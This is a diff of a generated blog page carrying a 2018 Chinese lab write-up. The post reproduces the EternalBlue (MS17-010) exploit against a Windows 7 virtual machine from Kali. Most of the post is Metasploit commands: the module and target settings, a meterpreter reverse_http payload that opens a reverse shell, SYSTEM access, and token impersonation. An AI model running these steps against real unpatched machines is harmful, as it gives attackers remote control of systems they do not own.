@@ -6,15 +6,26 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>Archives: 2018 | welcome to my blogs</title>
+  <title>msf中使用ms17010 | welcome to my blogs</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="welcome to my blogs">
-<meta property="og:url" content="http://yoursite.com/archives/2018/page/2/index.html">
+  <meta name="description" content="永恒之蓝已经被爆出很久了，但还是有很多win7机器没有修补漏洞，今天我才使用虚拟机win7和kali进行了复现实验环境：  kali 192.168.59.128  win7 192.168.59.129 （uac关闭）">
+<meta name="keywords" content="内网渗透">
+<meta property="og:type" content="article">
+<meta property="og:title" content="msf中使用ms17010">
+<meta property="og:url" content="http://yoursite.com/2018/09/09/essay-ms17010/index.html">
 <meta property="og:site_name" content="welcome to my blogs">
+<meta property="og:description" content="永恒之蓝已经被爆出很久了，但还是有很多win7机器没有修补漏洞，今天我才使用虚拟机win7和kali进行了复现实验环境：  kali 192.168.59.128  win7 192.168.59.129 （uac关闭）">
 <meta property="og:locale" content="default">
+<meta property="og:image" content="http://yoursite.com/2018/09/09/essay-ms17010/1.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/09/essay-ms17010/2.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/09/essay-ms17010/3.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/09/essay-ms17010/4.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/09/essay-ms17010/5.png">
+<meta property="og:updated_time" content="2018-09-10T03:05:23.789Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="welcome to my blogs">
+<meta name="twitter:title" content="msf中使用ms17010">
+<meta name="twitter:description" content="永恒之蓝已经被爆出很久了，但还是有很多win7机器没有修补漏洞，今天我才使用虚拟机win7和kali进行了复现实验环境：  kali 192.168.59.128  win7 192.168.59.129 （uac关闭）">
+<meta name="twitter:image" content="http://yoursite.com/2018/09/09/essay-ms17010/1.png">
   
     <link rel="alternative" href="/atom.xml" title="welcome to my blogs" type="application/atom+xml">
   
@@ -151,65 +162,239 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-essay-ms17010" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2018" class="archive-year">2018</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/05/19/hello-world/" class="archive-article-date">
-  	<time datetime="2018-05-19T09:18:33.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-05-19</time>
-</a>
-        </div>
-    	 
+      <header class="article-header">
+        
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/05/19/hello-world/">菜鸡的自我修养</a>
+    <h1 class="article-title" itemprop="name">
+      msf中使用ms17010
     </h1>
   
 
 
 
-        <div class="article-info info-on-right">
-          
+        
+        <a href="/2018/09/09/essay-ms17010/" class="archive-article-date">
+  	<time datetime="2018-09-09T14:19:52.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-09-09</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="永恒之蓝已经被爆出很久了，但还是有很多win7机器没有修补漏洞，今天我才使用虚拟机win7和kali进行了复现"><a href="#永恒之蓝已经被爆出很久了，但还是有很多win7机器没有修补漏洞，今天我才使用虚拟机win7和kali进行了复现" class="headerlink" title="永恒之蓝已经被爆出很久了，但还是有很多win7机器没有修补漏洞，今天我才使用虚拟机win7和kali进行了复现"></a>永恒之蓝已经被爆出很久了，但还是有很多win7机器没有修补漏洞，今天我才使用虚拟机win7和kali进行了复现</h3><p>实验环境：</p>
+<ul>
+<li><p>kali 192.168.59.128</p>
+</li>
+<li><p>win7 192.168.59.129 （uac关闭）</p>
+<a id="more"></a>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># service postgresql start 打开postgresql</span></span><br><span class="line">root@kali:~<span class="comment"># msfconsole 打开msf</span></span><br><span class="line">msf &gt; search eternalblue <span class="comment">#查找永恒之蓝模块</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2018/09/09/essay-ms17010/1.png" alt=""></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/windows/smb/ms17_010_eternalblue <span class="comment">#使用第三个模块</span></span><br><span class="line">msf exploit(windows/smb/ms17_010_eternalblue) &gt; show options <span class="comment">#查看配置信息</span></span><br><span class="line">msf exploit(windows/smb/ms17_010_eternalblue) &gt; <span class="built_in">set</span> RHOST 192.168.59.129 <span class="comment">#靶机ip</span></span><br><span class="line">msf exploit(windows/smb/ms17_010_eternalblue) &gt; <span class="built_in">set</span> LHOST 192.168.59.128 <span class="comment">#攻击机ip</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2018/09/09/essay-ms17010/2.png" alt=""><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(windows/smb/ms17_010_eternalblue) &gt; show payloads <span class="comment">#查看payloads</span></span><br><span class="line">msf exploit(windows/smb/ms17_010_eternalblue) &gt; <span class="built_in">set</span> payload windows/x64/meterpreter/reverse_http <span class="comment">#设置payload</span></span><br><span class="line">msf exploit(windows/smb/ms17_010_eternalblue) &gt; exploit <span class="comment">#攻击</span></span><br><span class="line">msf exploit(windows/smb/ms17_010_eternalblue) &gt; back <span class="comment">#如果失败则返回上层更换模块</span></span><br></pre></td></tr></table></figure></p>
+<p><img src="/2018/09/09/essay-ms17010/3.png" alt=""></p>
+<p>session已建立<br>但在执行reboot命令以及在shell里面运行shutdown命令时失败，错误代码1314（<code>getsystem</code>命令可以一键提权)</p>
+<p><img src="/2018/09/09/essay-ms17010/4.png" alt=""></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getuid <span class="comment">#查看权限</span></span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure>
+<p>令牌伪造</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; use incognito <span class="comment">#加载incognito功能</span></span><br><span class="line">meterpreter &gt; list_tokens -u <span class="comment">#列出可用令牌</span></span><br><span class="line">meterpreter &gt; impersonate_token WIN-6LMKOEQAO5E\\r1ngs <span class="comment">#伪造令牌</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2018/09/09/essay-ms17010/5.png" alt=""></p>
+<p>虽然使用reboot依然提示<code>Access is denied</code>但是使用shell已经可使用<code>shutdown</code>命令关机了</p>
+
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>dark吉dark利，今van吃鸡<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">homepage</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">内网渗透</a>
         		</li>
       		
 		</ul>
 	</div>
 
-          
+      
+	<div class="article-category tagcloud">
+		<i class="icon-book icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="/categories/essays//" class="article-tag-list-link color2">essays</a>
+        		</li>
+      		
+		</ul>
+	</div>
 
+
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2018/09/09/essay-ms17010/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
+  
+<nav id="article-nav">
   
   
-    </div></section>
+    <a href="/2018/08/21/summary-xss/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">xss</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+  
+  <div class="duoshuo">
+	<!-- 多说评论框 start -->
+	<div class="ds-thread" data-thread-key="essay-ms17010" data-title="msf中使用ms17010" data-url="http://yoursite.com/2018/09/09/essay-ms17010/"></div>
+	<!-- 多说评论框 end -->
+	<!-- 多说公共JS代码 start (一个网页只需插入一次) -->
+	<script type="text/javascript">
+	var duoshuoQuery = {short_name:"true"};
+	(function() {
+		var ds = document.createElement('script');
+		ds.type = 'text/javascript';ds.async = true;
+		ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+		ds.charset = 'UTF-8';
+		(document.getElementsByTagName('head')[0] 
+		 || document.getElementsByTagName('body')[0]).appendChild(ds);
+	})();
+	</script>
+	<!-- 多说公共JS代码 end -->
+</div>
+
+  
+  
+  
+  <div id="cloud-tie-wrapper" class="cloud-tie-wrapper"></div>
+<script>
+  var cloudTieConfig = {
+    url: "http://yoursite.com/2018/09/09/essay-ms17010/", 
+    sourceId: "essay-ms17010",
+    productKey: "true",
+    target: "cloud-tie-wrapper"
+  };
+</script>
+<script src="//img1.cache.netease.com/f2e/tie/yun/sdk/loader.js"></script>
   
 
-    
-    <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/archives/2018/">&laquo; Prev</a><a class="page-number" href="/archives/2018/">1</a><span class="page-number current">2</span>
-    </nav>
+  
+  <div id="SOHUCS" sid="essay-ms17010" ></div> 
+<script charset="utf-8" type="text/javascript" src="//changyan.sohu.com/upload/changyan.js" ></script>
+<script type="text/javascript">
+    window.changyan.api.config({
+        appid: "true",
+        conf: "true"
+    });
+</script>
+</script>
+  
+
+  
+
   
 
 
@@ -234,8 +419,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
